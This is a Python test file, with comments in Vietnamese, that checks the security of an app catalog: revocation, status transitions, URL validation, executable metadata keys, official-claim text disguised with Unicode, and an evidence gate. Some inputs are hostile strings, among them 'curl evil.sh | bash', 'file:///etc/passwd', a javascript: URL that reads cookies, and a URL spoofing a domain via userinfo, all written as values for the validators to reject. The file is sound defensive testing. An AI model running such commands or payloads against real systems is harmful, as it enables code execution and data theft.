"""Catalog/metadata adversarial — SEC-007/008, ECO-003/006/007, §11.2.
tamper hash/downgrade/replay, revoked van bi chan (namios_catalog,
namios_eco validator, namios_evidence gate)."""

from __future__ import annotations

from tests.security.sweep._fixtures import minimal_manifest

from namios_catalog.store import InMemoryCatalogStore
from namios_core.catalog_types import CatalogEntry, RevocationRecord
from namios_core.compat import CompatStatus
from namios_core.evidence_types import EvidenceReport, EvidenceTest
from namios_eco.status import NEVER_USABLE_STATUSES, PublishedStatus
from namios_eco.validator import (
    ALLOWED_STATUS_TRANSITIONS,
    FORBIDDEN_EXECUTABLE_KEYS,
    validate_no_executable_keys,
    validate_no_official_claim_text,
    validate_official_url,
    validate_status_transition,
    validate_usability_claim,
)
from namios_evidence._gate import compute_allowed_status

_TS = "2026-11-01T00:00:00Z"

# ---------------------------------------------------------------------------
# namios_catalog — revocation phai chan tuyet doi, khong lai voi tam thoi.
# ---------------------------------------------------------------------------


def test_catalog_is_revoked_blocks_app_even_though_entry_still_listed() -> None:
    store = InMemoryCatalogStore()
    manifest = minimal_manifest(app_id="evil.app")
    store.add(CatalogEntry(manifest=manifest, digest="d" * 64, channel="stable"))
    store.revoke(RevocationRecord(target_id="evil.app", reason="malware", revoked_at=_TS))

    assert store.is_revoked("evil.app") is True
    # Entry van con trong list/get (lich su) nhung is_revoked PHAI tra True
    # -- caller KHONG duoc coi "con trong catalog" la "an toan dung".
    assert store.get("evil.app") is not None


def test_catalog_revocation_does_not_bleed_into_similarly_named_app() -> None:
    store = InMemoryCatalogStore()
    manifest_v1 = minimal_manifest(app_id="app.v1")
    manifest_v12 = minimal_manifest(app_id="app.v1.2")
    store.add(CatalogEntry(manifest=manifest_v1, digest="a" * 64, channel="stable"))
    store.add(CatalogEntry(manifest=manifest_v12, digest="b" * 64, channel="stable"))
    store.revoke(RevocationRecord(target_id="app.v1", reason="x", revoked_at=_TS))

    assert store.is_revoked("app.v1") is True
    assert store.is_revoked("app.v1.2") is False


def test_catalog_search_does_not_leak_revoked_status_via_name_tamper(tmp_path) -> None:
    """Tim kiem accent-insensitive khong duoc anh huong boi trang thai
    revoke -- search la INDEX HIEN THI, revoke la THUOC TINH RIENG; dam bao
    hai co che khong vo tinh troi vao nhau (vd field 'name' bi doi khong
    khien is_revoked() doi theo)."""

    store = InMemoryCatalogStore()
    manifest = minimal_manifest(app_id="ung-dung-ke-toan")
    store.add(CatalogEntry(manifest=manifest, digest="c" * 64, channel="stable"))
    store.revoke(RevocationRecord(target_id="ung-dung-ke-toan", reason="y", revoked_at=_TS))

    results = store.search("Sweep Demo")
    assert len(results) == 1
    assert store.is_revoked(results[0].manifest.id) is True


def test_catalog_unrevoke_is_the_only_way_to_clear_revocation_not_re_add() -> None:
    store = InMemoryCatalogStore()
    manifest = minimal_manifest(app_id="app.x")
    store.add(CatalogEntry(manifest=manifest, digest="a" * 64, channel="stable"))
    store.revoke(RevocationRecord(target_id="app.x", reason="y", revoked_at=_TS))

    # Them lai entry (vd "re-publish") KHONG duoc tu dong xoa revocation --
    # chi "unrevoke" ro rang moi duoc coi la go thu hoi.
    store.add(CatalogEntry(manifest=manifest, digest="a" * 64, channel="stable"))
    assert store.is_revoked("app.x") is True

    store.unrevoke("app.x")
    assert store.is_revoked("app.x") is False


# ---------------------------------------------------------------------------
# namios_eco validator — ECO-006 URL gia mao domain; ECO-003 usability gate
# tuyet doi; ECO-003 state machine khong nhay tat/thoat revoked; ECO-007
# chong lach bang Unicode.
# ---------------------------------------------------------------------------


def test_validate_official_url_rejects_userinfo_domain_spoofing() -> None:
    errors = validate_official_url("https://co-quan.gov.vn@trang-gia.example/download")
    assert len(errors) >= 1


def test_validate_official_url_rejects_non_http_scheme() -> None:
    errors = validate_official_url("file:///etc/passwd")
    assert len(errors) >= 1


def test_validate_official_url_rejects_javascript_scheme() -> None:
    errors = validate_official_url("javascript:alert(document.cookie)")
    assert len(errors) >= 1


def test_validate_official_url_rejects_missing_domain() -> None:
    errors = validate_official_url("https:///path-only-no-host")
    assert len(errors) >= 1


def test_validate_usability_claim_blocks_downloadable_only_from_being_usable() -> None:
    errors = validate_usability_claim(PublishedStatus.DOWNLOADABLE_ONLY, claimed_usable=True)
    assert len(errors) == 1


def test_validate_usability_claim_blocks_launches_only_from_being_usable() -> None:
    errors = validate_usability_claim(PublishedStatus.LAUNCHES_ONLY, claimed_usable=True)
    assert len(errors) == 1


def test_never_usable_statuses_constant_matches_gate_exactly() -> None:
    for status in NEVER_USABLE_STATUSES:
        errors = validate_usability_claim(status, claimed_usable=True)
        assert len(errors) == 1, f"gate khong chan {status}"


def test_validate_status_transition_rejects_jump_to_workflow_verified() -> None:
    errors = validate_status_transition(
        PublishedStatus.NOT_INVENTORIED, PublishedStatus.WORKFLOW_VERIFIED
    )
    assert len(errors) == 1


def test_validate_status_transition_rejects_leaving_revoked_terminal_state() -> None:
    errors = validate_status_transition(PublishedStatus.REVOKED, PublishedStatus.DOWNLOADABLE_ONLY)
    assert len(errors) == 1
    revoked_targets = ALLOWED_STATUS_TRANSITIONS.get(PublishedStatus.REVOKED, frozenset())
    assert not revoked_targets


def test_validate_status_transition_rejects_downgrade_replay_to_not_inventoried() -> None:
    """Mo phong "downgrade/replay" metadata cu: cho du workflow_verified da
    dat duoc, mot ban ghi cu/gia mao co the thu dua trang thai lui ve
    not_inventoried -- phai bi chan (khong co trong allowlist)."""

    errors = validate_status_transition(
        PublishedStatus.WORKFLOW_VERIFIED, PublishedStatus.NOT_INVENTORIED
    )
    assert len(errors) == 1


def test_validate_no_executable_keys_rejects_deeply_nested_forbidden_key() -> None:
    raw = {"meta": {"steps": [{"detail": {"run": "curl evil.sh | bash"}}]}}
    errors = validate_no_executable_keys(raw)
    assert len(errors) == 1


def test_validate_no_executable_keys_covers_all_declared_forbidden_keys() -> None:
    for key in FORBIDDEN_EXECUTABLE_KEYS:
        errors = validate_no_executable_keys({key: "payload"})
        assert len(errors) == 1, f"khoa '{key}' khong bi chan"


def test_validate_no_official_claim_text_blocks_zero_width_space_split() -> None:
    sneaky = "Day la ​ứng dụng​ chính thức​ của​ NaMiOS​ cho ban."
    errors = validate_no_official_claim_text(sneaky, path="description")
    assert len(errors) == 1


def test_validate_no_official_claim_text_blocks_fullwidth_nfkc_variant() -> None:
    # Dung ky tu "full-width" (compatibility) cho vai chu -- NFKC se gop ve
    # dang chuan truoc khi so khop.
    sneaky = "Sản phẩm này là ứng dụng chính thức của NaMiOS."
    errors = validate_no_official_claim_text(sneaky, path="description")
    assert len(errors) == 1


def test_validate_no_official_claim_text_blocks_no_diacritics_variant() -> None:
    sneaky = "San pham nay la ung dung chinh thuc cua namios."
    errors = validate_no_official_claim_text(sneaky, path="description")
    assert len(errors) == 1


def test_validate_no_official_claim_text_allows_unrelated_description() -> None:
    text = "San pham ben thu ba, khong lien quan NaMiOS."
    errors = validate_no_official_claim_text(text, path="description")
    assert len(errors) == 0


# ---------------------------------------------------------------------------
# namios_evidence._gate — revoked tuyet doi; qa_reviewer rong/whitespace
# khong duoc coi la da duyet; khong co test required -> untested (khong
# duoc suy dien da lam).
# ---------------------------------------------------------------------------


def _report(**kwargs) -> EvidenceReport:
    base = dict(
        report_id="rep-1",
        manifest_id="app.x",
        tests=(),
        decision="pending",
        qa_reviewer=None,
        environment={},
    )
    base.update(kwargs)
    return EvidenceReport(**base)


def test_gate_revoked_decision_wins_even_with_all_required_tests_passing() -> None:
    report = _report(
        decision="revoked",
        tests=(EvidenceTest(test_id="t1", required=True, result="pass"),),
        qa_reviewer="qa.nguyen.van.a",
    )
    result = compute_allowed_status(report)
    assert result.allowed_status == CompatStatus.REVOKED


def test_gate_rejects_task_verified_when_qa_reviewer_is_whitespace_only() -> None:
    report = _report(
        tests=(EvidenceTest(test_id="t1", required=True, result="pass"),),
        qa_reviewer="   ",
    )
    result = compute_allowed_status(report)
    assert result.allowed_status != CompatStatus.TASK_VERIFIED
    assert result.allowed_status == CompatStatus.EXPERIMENTAL


def test_gate_rejects_task_verified_when_qa_reviewer_is_empty_string() -> None:
    report = _report(
        tests=(EvidenceTest(test_id="t1", required=True, result="pass"),),
        qa_reviewer="",
    )
    result = compute_allowed_status(report)
    assert result.allowed_status != CompatStatus.TASK_VERIFIED


def test_gate_treats_skipped_required_test_as_not_pass() -> None:
    report = _report(
        tests=(
            EvidenceTest(test_id="t1", required=True, result="pass"),
            EvidenceTest(test_id="t2", required=True, result="skipped"),
        ),
        qa_reviewer="qa.reviewer",
    )
    result = compute_allowed_status(report)
    assert result.allowed_status == CompatStatus.BLOCKED


def test_gate_treats_blocked_external_dependency_as_blocked_not_verified() -> None:
    report = _report(
        tests=(EvidenceTest(test_id="t1", required=True, result="blocked_external_dependency"),),
        qa_reviewer="qa.reviewer",
    )
    result = compute_allowed_status(report)
    assert result.allowed_status == CompatStatus.BLOCKED


def test_gate_with_no_required_tests_declared_cannot_claim_task_verified() -> None:
    """Chong 'gian lan khai bao': neu khong khai required test nao, khong
    the suy ra tac vu bat buoc da lam xong -- toi da untested, du co 10 test
    optional deu pass + co qa_reviewer."""

    report = _report(
        tests=(
            EvidenceTest(test_id="opt1", required=False, result="pass"),
            EvidenceTest(test_id="opt2", required=False, result="pass"),
        ),
        qa_reviewer="qa.reviewer",
    )
    result = compute_allowed_status(report)
    assert result.allowed_status == CompatStatus.UNTESTED


def test_gate_full_pass_with_qa_reviewer_yields_task_verified_control_case() -> None:
    """Doi chung: khi dung dieu kien (required pass + qa_reviewer) thi PHAI
    cho task_verified -- xac nhan gate khong qua tay chan nham."""

    report = _report(
        tests=(EvidenceTest(test_id="t1", required=True, result="pass"),),
        qa_reviewer="qa.reviewer",
    )
    result = compute_allowed_status(report)
    assert result.allowed_status == CompatStatus.TASK_VERIFIED
